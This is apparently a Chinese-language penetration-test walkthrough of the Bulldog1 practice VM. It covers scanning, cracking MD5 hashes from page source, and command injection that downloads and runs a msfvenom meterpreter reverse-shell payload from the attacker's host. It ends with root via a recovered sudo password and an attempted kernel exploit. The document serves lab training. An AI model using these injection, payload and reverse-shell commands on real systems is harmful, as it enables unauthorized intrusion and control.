# Bulldog1渗透实战

## 扫描不到bulldog主机ip

​	【1】从新启动bulldog，到开机页面选择第二个Ubuntu的高级选项。
​	【2】进入高级选项，再次选择第二个Linux内核版本的恢复模式回车。
选择root一行回车，进入命令行模式。

```
vim /etc/network/interfaces ，修改网卡名称成步骤查询的结果，保存。
	auto ens33
	iface ens33 inet dhcp
reboot
```

```
输入 ifconfig -a （查看网卡名称）

dhclient
```

## 目标主机IP：192.168.100.149

```
nmap 192.168.100.149     
```

![image-20210918190613519](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918190613519.png)

```
nmap -sV -T4 -p 23,80,8080 192.168.100.149
```

![image-20210918190817548](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918190817548.png)

```
whatweb 192.168.100.149
```

![image-20210918191053164](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918191053164.png)
	

```
dirb http://192.168.100.149
```

​	![image-20210918191258280](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918191258280.png)

> 访问http://192.168.37.141/admin/
>
> url-->http://192.168.100.149/admin/login/?next=/admin/

​	![image-20210918191543740](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918191543740.png)

>  访问http://192.168.37.141/dev

![](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918191748073.png)

> 访问http://192.168.37.141/dev 的源码

![image-20210918191947541](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918191947541.png)

	Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
	Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
	Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
	Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
	Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
	Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--> 
	Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->

[md5在线解密破解,md5解密加密](https://www.cmd5.com/)

>  分析源码可以猜测：

    ```
    用户名为nick，密码为bulldog；
    用户名为sarah，密码为bulldoglover；
    ```

**尝试进行登录主页**

![image-20210918192345052](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918192345052.png)

>  认证成功之后，尝试访问http://192.168.100.149/dev/shell/

![image-20210918192557473](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918192557473.png)

## **获取shell**

- msfvenom生成木马

```
sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
```

**linux.rc**

```sh
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.143
set LPORT 4444
exploit
```

- 开启监听

```sh
msfconsole  -qr /home/xiaoxiaoran/shell/linux.rc  
```
- 命令注入执行木马

```sh
ls & wget http://192.168.100.143/xiao3
ls & chmod +x xiao3
ls & ./xiao3
```

## **提权操作**

```
meterpreter > cat /etc/passwd
```

![image-20210918193938607](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918193938607.png)

```
meterpreter > cd /home/bulldogadmin 
meterpreter > ls
```

![image-20210918194143202](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918194143202.png)

```
meterpreter > cd .hiddenadmindirectory 
meterpreter > ls
```

![image-20210918194428775](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918194428775.png)

```
meterpreter > cat note 
```

![image-20210918195323361](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918195323361.png)

```
meterpreter > download customPermissionApp /temp

┌──(root192)-[/temp]
└─# strings customPermissionApp 
```

![image-20210918195424428](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918195424428.png)

猜测可能是密码，应为**SUPER**、 ulitimate、PASSWORD、youCANTget\****， 可以把他们连到一起正好是SUPER ultimate PASSWORD you CAN Tget，H是来混淆的，中间刚好有PADDWORD；

```
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")';
sudo python -c 'import pty; pty.spawn("/bin/bash")';
```

![image-20210918200653420](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918200653420.png)

```
密码为 SUPERultimatePASSWORDyouCANTget
```



## ok....拿到root

## 后续

```
meterpreter > sysinfo
```

![image-20210918203701419](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918203701419.png)

```
searchsploit Ubuntu 16.04    
```

![image-20210918203800875](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/image-20210918203800875.png)

```
meterpreter > upload /tmp /usr/share/exploitdb/exploits/linux/local/44298.c
```

```
gcc -pthread 44298.c -o exp -lcrypt
```

## 没有gcc  --.--

